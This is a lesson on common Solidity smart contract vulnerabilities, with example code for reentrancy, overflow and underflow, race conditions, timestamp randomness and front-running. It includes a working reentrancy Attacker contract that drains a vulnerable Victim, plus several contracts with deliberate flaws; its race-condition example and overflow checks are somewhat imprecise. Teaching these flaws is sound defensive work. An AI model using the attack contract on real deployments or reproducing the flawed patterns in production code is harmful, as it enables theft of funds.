## Lesson 2: Common Smart Contract Vulnerabilities

### Overview

In this lesson, we will explore common vulnerabilities in smart contracts that attackers often exploit. Understanding these vulnerabilities is key to developing secure smart contracts and protecting decentralized applications from attacks.

## Reentrancy

Reentrancy is a vulnerability that occurs when a smart contract's function is called recursively before the previous invocation of the function has completed. This can lead to unexpected behavior, such as the manipulation of contract state and the unauthorized withdrawal of funds.

```solidity
// Victim Contract
pragma solidity ^0.6.0;

contract Victim {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed.");
        balances[msg.sender] = 0;
    }
}

// Attacker Contract
pragma solidity ^0.6.0;

import "./Victim.sol";

contract Attacker {
    Victim public victim;
    
    constructor(address victimAddress) public {
        victim = Victim(victimAddress);
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    fallback() external payable {
        if (address(victim).balance >= msg.value) {
            victim.withdraw();
        }
    }
}

```


### Integer Overflow and Underflow

Integer overflow and underflow occur when a variable's value exceeds its maximum or minimum limit, causing it to wrap around to an unintended value. This can lead to unexpected behavior in smart contracts, such as the manipulation of token balances or the bypassing of access controls.

```solidity
pragma solidity ^0.6.0;

contract IntegerOverflowUnderflow {
    uint256 public counter;

    function increment(uint256 value) public {
        uint256 oldCounter = counter;

        // Potential problem: If counter + value exceeds the maximum possible value for uint256,
        // it will wrap around to a smaller value, causing an integer overflow.
        counter += value;

        // This check mitigates the integer overflow problem by ensuring the new counter value is greater than the old one.
        require(counter > oldCounter, "Integer overflow.");
    }

    function decrement(uint256 value) public {
        uint256 oldCounter = counter;

        // Potential problem: If counter - value goes below 0, it will wrap around to a large value,
        // causing an integer underflow.
        counter -= value;

        // This check mitigates the integer underflow problem by ensuring the new counter value is smaller than the old one.
        require(counter < oldCounter, "Integer underflow.");
    }
}
```

## Race Conditions

Race conditions occur when the behavior of a smart contract depends on the relative timing of events, such as external calls or transactions. Attackers can exploit race conditions to manipulate contract state, interfere with intended functionality, or gain unauthorized access to resources.

```solidity
pragma solidity ^0.6.0;

contract RaceCondition {
    uint256 public value;

    function setValue(uint256 newValue) external {
        // Potential problem: External calls could lead to race conditions
        someExternalCall();

        // Another user may change the value before the current call is completed
        value = newValue;
    }

    function someExternalCall() internal {
        // ...
    }
}
```

## Timestamp Dependency

Smart contracts that rely on timestamps for critical functionality, such as random number generation or time-based access control, can be vulnerable to manipulation by miners who can influence block timestamps. This can lead to unpredictable behavior and potential exploits.

```solidity
pragma solidity ^0.6.0;

contract TimestampDependency {
    uint256 public randomNumber;

    function generateRandomNumber() external {
        // Potential problem: Using block.timestamp for randomness is not secure
        // Miners can manipulate the timestamp to some extent, making the generated random number predictable
        randomNumber = uint256(keccak256(abi.encodePacked(block.timestamp))) % 100;
    }
}

```

## Front-Running

Front-running is a type of attack where an attacker observes a pending transaction and then submits their own transaction with a higher gas price, causing it to be mined before the original transaction. This can be used to manipulate prices on decentralized exchanges or disrupt other smart contract functionality.

```solidity
// This is a simple illustration of a contract where front-running could occur.
pragma solidity ^0.6.0;

contract FrontRunning {
    uint256 public value;
    uint256 public highestBid;

    function bid(uint256 newValue) external {
        // Potential problem: Front-running can occur here.
        // Attackers can observe pending transactions and submit their own transaction with a higher gas price,
        // getting their transaction mined before the original one, effectively outbidding the original bidder.
        require(newValue > highestBid, "Bid is not higher than the current highest bid.");

        highestBid = newValue;
    }
}
```

## Conclusion

Understanding these common smart contract vulnerabilities and their potential consequences is crucial for developing secure decentralized applications. In the next lesson, we will cover secure coding practices that help mitigate these vulnerabilities and protect smart contracts from exploits.
